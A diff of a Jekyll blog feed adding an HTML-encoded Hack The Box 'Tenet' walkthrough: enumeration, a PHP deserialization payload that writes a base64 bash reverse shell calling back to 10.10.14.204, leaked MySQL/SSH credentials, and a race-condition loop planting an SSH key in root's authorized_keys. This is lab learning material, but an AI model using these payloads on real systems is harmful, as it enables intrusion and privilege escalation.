@@ -1,4 +1,176 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-06-07T19:27:19-07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Alex Loney</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>Alex Loney</name></author><entry><title type="html">New Blog Who Dis</title><link href="http://localhost:4000/blog/new-blog-who-dis/" rel="alternate" type="text/html" title="New Blog Who Dis" /><published>2021-06-07T15:15:00-07:00</published><updated>2021-06-07T15:15:00-07:00</updated><id>http://localhost:4000/blog/new-blog-who-dis</id><content type="html" xml:base="http://localhost:4000/blog/new-blog-who-dis/">&lt;p&gt;I’d like to welcome you to my blog!!&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-06-13T17:27:21-07:00</updated><id>/feed.xml</id><title type="html">Alex Loney</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>Alex Loney</name></author><entry><title type="html">HTB: Tenet Writeup</title><link href="/blog/writeup/htb/htb-tenet/" rel="alternate" type="text/html" title="HTB: Tenet Writeup" /><published>2021-06-07T18:46:00-07:00</published><updated>2021-06-07T18:46:00-07:00</updated><id>/blog/writeup/htb/htb-tenet</id><content type="html" xml:base="/blog/writeup/htb/htb-tenet/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+
+&lt;p&gt;Beginning this box as every box, with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan of the box to locate open ports.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/tenet 10.10.10.223
+Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-06-07 20:00 EDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.223
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.079s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;11.61 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;foothold&quot;&gt;Foothold&lt;/h1&gt;
+&lt;p&gt;The box appears to have only two open ports (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;22&lt;/code&gt;). Visiting port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt;, it appears to be an Apache site, so then running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; on it locates an interesting directory:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.223
+...&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;snip&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;...
+/wordpress &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+...&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;snip&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Visiting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/wordpress&lt;/code&gt; URL in Firefox gives a badly formatted Wordpress site, which looks like it’s trying to add resources from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tenet.htb&lt;/code&gt;. So we may add &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.223 tenet.htb&lt;/code&gt; to our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file.&lt;/p&gt;
+
+&lt;p&gt;Browsing the site, I see a user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;neil&lt;/code&gt; posted a comment:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;So that’s interesting, it sounds like there’s a “sator” php file (maybe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sator.php&lt;/code&gt;?). Visiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://tenet.htb/sator.php&lt;/code&gt; gives a 404 error, but remembering from before, we’re within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/wordpress&lt;/code&gt; directory, so what about &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.223/sator.php&lt;/code&gt;? Success!!&lt;/p&gt;
+
+&lt;p&gt;This &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sator.php&lt;/code&gt; script is printing the following:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;[+] Grabbing users from text file
+[] Database updated&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The comment from neil on the Wordpress form mentioned a backup file, so accessing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.223/sator.php.bak&lt;/code&gt; and it exists!&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DatabaseExport&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;users.txt&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;update_db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;[+] Grabbing users from text file &amp;lt;br&amp;gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Success&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+
+        &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__DIR__&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;[] Database updated &amp;lt;br&amp;gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;//      echo &apos;Gotta get this working properly...&apos;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;arepo&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$databaseupdate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;unserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DatabaseExport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;update_db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+
+
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Examining this PHP script, we may see that it is receiving user input via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arepo&lt;/code&gt; variable, passing that to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unserialize&lt;/code&gt;, then calling the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DatabaseExport&lt;/code&gt; class. This looks like a classic example of PHP object deserialization. Basically, from my understanding, what is happening is that PHP will allow you to serialize a class and all of the data within it into a string which may then be deserialized back into a class. Then when the control flow exits, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__destruct&lt;/code&gt; function is called on it. In this example, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__destruct&lt;/code&gt; function writes the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt; value to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user_file&lt;/code&gt;. &lt;a href=&quot;https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a&quot;&gt;More on PHP deserialization may be read here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Since we know the name of the class (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DatabaseExport&lt;/code&gt;) as well as the variable names (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user_file&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt;), we can construct a payload that is a deserialized PHP object that will allow us to write data out to an arbitrary output file of our choice.&lt;/p&gt;
+
+&lt;p&gt;For this payload, we will write out to a PHP file with a very basic reverse shell.&lt;/p&gt;
+
+&lt;p&gt;To begin with, the reverse shell that I’d like to attempt is the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/bin/bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;bash -i &amp;gt; /dev/tcp/10.10.14.204/9000 0&amp;gt;&amp;amp;1&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Wrapping this in a PHP script to execute it, I get:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash -c &apos;bash -i &amp;gt; /dev/tcp/10.10.14.204/9000 0&amp;gt;&amp;amp;1&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;However, I forsee a problem here. Specifically the “&amp;amp;” character, which in a URL is treated as a special delimiter and might throw the payload off. So instead I’m going to base64 encode the reverse shell payload:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash -c &apos;bash -i &amp;gt; /dev/tcp/10.10.14.204/9000 0&amp;gt;&amp;amp;1&apos;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64
+&lt;/span&gt;L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMjA0LzkwMDAgMD4mMScK
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then, use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64_decode&lt;/code&gt; function in PHP to decode it before executing it:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMjA0LzkwMDAgMD4mMScK&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So that’s the payload I want to eventually write to a file.&lt;/p&gt;
+
+&lt;p&gt;Next up, I need to serialize that and put it into a proper payload that will deserialize correctly. For this, I’ll construct the following payload:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;O:14:&quot;DatabaseExport&quot;:2:{s:9:&quot;user_file&quot;;s:10:&quot;rshell.php&quot;;s:4:&quot;data&quot;;s:106:&quot;&amp;lt;?php exec(base64_decode(&quot;L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMjA0LzkwMDAgMD4mMScK&quot;));&quot;;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Above we begin with “O” (the letter Oh, not the number zero) to tell PHP that this is an object, followed by the length of the name (14) and the name (“DatabaseExport”). Next the “2” tells PHP that there are two elements in the next section. Within the section we use “s” to denote a string, then “9” for the length of the next string, which is the name of the variable, and the variable itself (“user_file”). Following that we have the same format to provide the variable contents (“rshell.php”). This is then repeated for the “data” variable to contain our payload.&lt;/p&gt;
+
+&lt;p&gt;If all goes well, this should generate a file named “rshell.php” which contains the payload to generate a reverse shell.&lt;/p&gt;
+
+&lt;p&gt;When using FireFox, the payload may be directly pasted in and FireFox will encode it. However, I like to be a little cautious and pre-encode before uploading.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hURL &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;O:14:&quot;DatabaseExport&quot;:2:{s:9:&quot;user_file&quot;;s:10:&quot;rshell.php&quot;;s:4:&quot;data&quot;;s:106:&quot;&amp;lt;?php exec(base64_decode(&quot;L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMjA0LzkwMDAgMD4mMScK&quot;));&quot;;}&apos;&lt;/span&gt;
+
+Original    :: O:14:&lt;span class=&quot;s2&quot;&gt;&quot;DatabaseExport&quot;&lt;/span&gt;:2:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;s:9:&lt;span class=&quot;s2&quot;&gt;&quot;user_file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;s:10:&lt;span class=&quot;s2&quot;&gt;&quot;rshell.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;s:4:&lt;span class=&quot;s2&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;s:106:&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php exec(base64_decode(&quot;&lt;/span&gt;L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMjA0LzkwMDAgMD4mMScK&lt;span class=&quot;s2&quot;&gt;&quot;));&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+URL ENcoded :: O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A10%3A%22rshell.php%22%3Bs%3A4%3A%22data%22%3Bs%3A106%3A%22%3C%3Fphp%20exec%28base64_decode%28%22L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMjA0LzkwMDAgMD4mMScK%22%29%29%3B%22%3B%7D
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now that we have the URL encoded payload, we may submit this via the PHP page.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;s1&quot;&gt;&apos;http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A10%3A%22rshell.php%22%3Bs%3A4%3A%22data%22%3Bs%3A106%3A%22%3C%3Fphp%20exec%28base64_decode%28%22L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMjA0LzkwMDAgMD4mMScK%22%29%29%3B%22%3B%7D&apos;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Setting up a netcat listener and visiting the page, we receive a successful callback.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 9000
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 9000 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.204] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.223] 29836
+python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import pty; pty.spawn(&apos;/bin/bash&apos;)&quot;&lt;/span&gt;
+www-data@tenet:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+www-data@tenet:/var/www/html&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We’ve successfully logged in as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt; user!&lt;/p&gt;
+
+&lt;h1 id=&quot;privesc&quot;&gt;Privesc&lt;/h1&gt;
+
+&lt;p&gt;Now we need to enumerate and determine exactly what we can do. For this I ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; to locate anything useful, which found the MySQL login information&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Mysql Database: wordpress
+Mysql User: neil
+Mysql Pass: Opera2112&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Quickly checking those credentials, the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;neil&lt;/code&gt; has the same password for SSH, so we now have SSH access as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;neil&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;An additional note is that the script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/local/bin/enableSSH.sh&lt;/code&gt; may be executed by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; by all users. However, without the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt; password, that wasn’t possible. But now that we have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;neil&lt;/code&gt;, that’s possible.&lt;/p&gt;
+
+&lt;p&gt;Taking a closer look at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enableSSH.sh&lt;/code&gt; script, it appears to have a hardcoded SSH public key inside of it, it then writes that key to a temporary file, then echos that temporary file into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/.ssh/authorized_keys&lt;/code&gt;. If we’re able to somehow intercept that temporary file after it is created but before it is sent into the root SSH keys, we can inject our own key into it. This is basically a race condition.&lt;/p&gt;
+
+&lt;p&gt;To do this, we could use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt; since that’s on the box, but it’s also possible to do this with a simple bash script.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ssh-rsa AAAAB3NzaC1yc2EAAAA...AlU= kali@kali&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tee&lt;/span&gt; /tmp/ssh-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The above will loop continuously and copy our SSH public key into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/ssh-*&lt;/code&gt; file path if/when it exists. This took a couple times before it successfully worked.&lt;/p&gt;
+
